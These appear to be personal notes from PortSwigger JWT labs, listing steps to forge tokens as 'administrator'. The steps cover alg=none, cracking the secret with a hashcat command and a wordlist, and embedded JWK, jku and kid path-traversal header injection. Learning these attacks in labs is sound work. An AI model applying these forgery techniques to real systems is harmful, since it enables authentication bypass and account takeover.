### JSON Web Tokens

https://blog.miguelgrinberg.com/post/json-web-tokens-with-public-key-signatures

https://blog.miniorange.com/what-is-jwt-json-web-token-how-does-jwt-authentication-work/

https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite

https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c

1. Change sub from wiener to administrator

2. Change sub from wiener to administrator, change alg to none. Remove the entire signature portion, leave the dot -> HEADER.PAYLOAD.

3. Crack JWT secret, using secret key, create a new JWT token with sub as administrator

hashcat -a 0 -m 16500 <jwt> <wordlist>

https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

https://jwt.io/

secret1

4. JWT authentication bypass via jwk header injection

server does not check if public key is legitimate

Use jwt.io to find out

- alg type: RS256

- signature type: RSASHA256

With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.

Generate a new RSA key.

Send a request containing a JWT to Burp Repeater.

In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.

Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.

Send the request to test how the server responds.

Signing algorithm: RS256

Signing key: RSA 2048

5. JWT authentication bypass via jku header injection

```
{
    "keys": [{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "7f6fbbc8-1bc8-4391-8c63-2d7881b94387",
    "n": "1jfQFKmlxptnODpeKMa4Mgg90MFhLOo2AMDdUY3Qd-qFdG5bvQMtCnzcVZlGx-g_lLPmCQP17JKB7gd91GaObKgRcNq-qj0M7ReSehazj_GEAiNEBdjUuvXCaODgnU4beveQKvHAA5H35Q8sJEv4pvD5b3n6EzJtQHUyRI5ENnIKzBfLQjIXuy8HPldOrjC0U3OF9qF9dj7_AsrJUxwCNElPk_vpWMDQ8Ha8PydHKSa_QLSVQ2gdP-V1h9VOBLjeiwxShP5pduWzpnbHRWbQTTqHVCn2J2kxj9mlfTq3F3R5sD0zd8p3denzTw1jkBEv8XUkSRTikxLaoXOIoVFcqw"
   }]
}
```

- Generate private keys, and the public key for that

```
{
    "jku": "https://exploit-0a6a008804745129c36e5a6e01330090.web-security-academy.net/.well-known/jwks.json",
    "kid": "7f6fbbc8-1bc8-4391-8c63-2d7881b94387",
    "typ": "JWT",
    "alg": "RS256"
}
```

- Add `jku header`, sign it and regenerate the jwt 
    
6. JWT authentication bypass via kid header path traversal
    
- https://www.programiz.com/python-programming/online-compiler/
    
- https://ao.ms/how-to-base64-encode-a-string-in-python/

- https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/

```
import base64
encoded = base64.b64encode(b"\x00")
print(encoded)
```





